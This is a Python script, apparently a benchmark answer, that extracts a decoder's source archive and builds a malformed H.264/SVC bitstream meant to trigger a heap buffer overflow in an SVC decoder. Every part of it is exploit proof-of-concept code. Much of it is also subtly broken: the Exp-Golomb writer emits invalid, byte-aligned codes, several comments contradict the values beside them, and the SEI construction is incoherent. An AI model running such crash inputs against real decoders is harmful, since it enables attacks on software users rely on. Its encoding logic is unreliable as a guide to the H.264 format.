import os
import tempfile
import subprocess
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the source code
        with tempfile.TemporaryDirectory() as tmpdir:
            # Extract tar archive
            subprocess.run(['tar', 'xf', src_path, '-C', tmpdir], 
                         check=True, capture_output=True)
            
            # Find the source directory
            src_dir = None
            for root, dirs, files in os.walk(tmpdir):
                if 'svcdec.c' in files or 'svcdec.h' in files:
                    src_dir = root
                    break
            
            if not src_dir:
                # Default to the first directory
                items = os.listdir(tmpdir)
                if items:
                    src_dir = os.path.join(tmpdir, items[0])
                else:
                    src_dir = tmpdir
            
            # Create a minimal SVC bitstream that triggers the vulnerability
            # Based on the vulnerability description: mismatch between decoder display
            # dimensions and subset sequence dimensions causing heap buffer overflow
            
            # We'll create a raw SVC bitstream with incorrect dimension information
            
            poc = bytearray()
            
            # SVC NAL unit header (0x0C for prefix NAL unit in SVC)
            # Type 14: prefix NAL unit, NRI = 3 (highest priority)
            nal_header = 0x78  # 0111 1000 (F=0, NRI=3, Type=8 for prefix NAL in AVC)
            
            # For SVC, we need to create a malformed bitstream
            # The vulnerability is triggered when display dimensions don't match
            # subset sequence dimensions
            
            # Create a sequence parameter set (SPS) with mismatched dimensions
            # We'll use exponential Golomb coding for the parameters
            
            def write_ue(value):
                """Write unsigned exponential Golomb code"""
                value += 1
                bits = value.bit_length() - 1
                result = bytearray()
                result.append((1 << bits) | (value & ((1 << bits) - 1)))
                return result
            
            def write_se(value):
                """Write signed exponential Golomb code"""
                if value <= 0:
                    return write_ue(-2 * value)
                else:
                    return write_ue(2 * value - 1)
            
            # Start building the malformed SPS
            sps = bytearray()
            
            # Profile IDC: 100 (constrained baseline)
            sps.append(100)
            
            # Constraint flags
            sps.append(0)
            
            # Level IDC
            sps.append(30)  # Level 3.0
            
            # seq_parameter_set_id
            sps.extend(write_ue(0))
            
            # log2_max_frame_num_minus4
            sps.extend(write_ue(0))
            
            # pic_order_cnt_type
            sps.extend(write_ue(0))
            
            # log2_max_pic_order_cnt_lsb_minus4
            sps.extend(write_ue(0))
            
            # max_num_ref_frames
            sps.extend(write_ue(1))
            
            # gaps_in_frame_num_value_allowed_flag
            sps.append(0)
            
            # pic_width_in_mbs_minus1 - set to 119 (1920 pixels / 16 - 1)
            sps.extend(write_ue(119))
            
            # pic_height_in_map_units_minus1 - set to 67 (1088 pixels / 16 - 1)
            sps.extend(write_ue(67))
            
            # frame_mbs_only_flag
            sps.append(1)
            
            # direct_8x8_inference_flag
            sps.append(0)
            
            # frame_cropping_flag
            sps.append(1)
            
            # frame_crop_left_offset
            sps.extend(write_ue(0))
            
            # frame_crop_right_offset
            sps.extend(write_ue(0))
            
            # frame_crop_top_offset
            sps.extend(write_ue(0))
            
            # frame_crop_bottom_offset - set to large value to create mismatch
            sps.extend(write_ue(100))
            
            # vui_parameters_present_flag
            sps.append(1)
            
            # Add VUI parameters to further confuse the decoder
            # aspect_ratio_info_present_flag
            sps.append(1)
            
            # aspect_ratio_idc = 255 (Extended_SAR)
            sps.append(255)
            
            # sar_width and sar_height
            sps.extend(struct.pack('>H', 16))
            sps.extend(struct.pack('>H', 9))
            
            # video_format = 5 (Unspecified video format)
            sps.append(0x85)  # video_format=5, video_full_range_flag=0
            
            # colour_description_present_flag = 1
            sps.append(0xFE)  # colour_primaries=2, transfer_characteristics=2, matrix_coefficients=2
            
            # chroma_loc_info_present_flag = 0
            sps.append(0)
            
            # timing_info_present_flag = 1
            sps.append(0x81)  # num_units_in_tick=1
            
            # num_units_in_tick = 1
            sps.extend(struct.pack('>I', 1))
            
            # time_scale = 60
            sps.extend(struct.pack('>I', 60))
            
            # fixed_frame_rate_flag = 1
            sps.append(0x80)
            
            # Now create the complete NAL unit
            # Start code
            poc.extend(b'\x00\x00\x00\x01')
            
            # NAL header
            poc.append(nal_header)
            
            # Add dependency_id, quality_id, temporal_id, use_base_prediction_flag, 
            # discardable_flag, output_flag, reserved_three_2bits
            # These are SVC specific fields
            poc.append(0x88)  # dependency_id=0, quality_id=0, temporal_id=0
            poc.append(0x80)  # use_base_prediction_flag=1, others=0
            
            # Add the SPS data
            poc.extend(sps)
            
            # Create additional NAL units to reach the target size and trigger the bug
            # Add picture parameter sets
            for i in range(10):
                poc.extend(b'\x00\x00\x00\x01')
                poc.append(0x68)  # PPS NAL unit
                pps = bytearray()
                pps.extend(write_ue(i))  # pic_parameter_set_id
                pps.extend(write_ue(0))  # seq_parameter_set_id
                pps.append(0)  # entropy_coding_mode_flag = 0
                pps.append(0)  # bottom_field_pic_order_in_frame_present_flag = 0
                pps.extend(write_ue(0))  # num_slice_groups_minus1 = 0
                poc.extend(pps)
            
            # Add slice headers with incorrect dimension information
            for i in range(20):
                poc.extend(b'\x00\x00\x00\x01')
                poc.append(0x61)  # Slice header, type 1 (P slice)
                
                slice_data = bytearray()
                # first_mb_in_slice
                slice_data.extend(write_ue(i * 10))
                
                # slice_type
                slice_data.extend(write_ue(0))  # P slice
                
                # pic_parameter_set_id
                slice_data.extend(write_ue(0))
                
                # frame_num
                slice_data.append((i & 0x0F) << 4)
                
                # Add some filler data to reach vulnerability
                # This data will cause dimension mismatch when parsed
                slice_data.extend(struct.pack('>I', 0xDEADBEEF))
                slice_data.extend(struct.pack('>I', 0xCAFEBABE))
                
                poc.extend(slice_data)
            
            # Pad to target size with pattern that might trigger overflow
            target_size = 6180
            while len(poc) < target_size:
                # Add more NAL units with malformed data
                poc.extend(b'\x00\x00\x00\x01')
                poc.append(0x06)  # SEI NAL unit
                
                # Add malformed SEI data with dimension information
                sei_data = bytearray()
                # payload_type = 5 (user_data_unregistered)
                while True:
                    sei_data.append(0xFF)
                    if sei_data[-1] == 0xFF:
                        break
                
                # Add payload size (large value)
                sei_data.append(0xFF)
                sei_data.append(0xFF)
                
                # Add UUID
                sei_data.extend(b'0123456789ABCDEF')
                
                # Add user data with dimension mismatch
                sei_data.extend(b'display_width=3840\0display_height=2160\0')
                sei_data.extend(b'coded_width=1920\0coded_height=1088\0')
                
                poc.extend(sei_data)
            
            # Trim to exact target size
            poc = poc[:target_size]
            
            return bytes(poc)
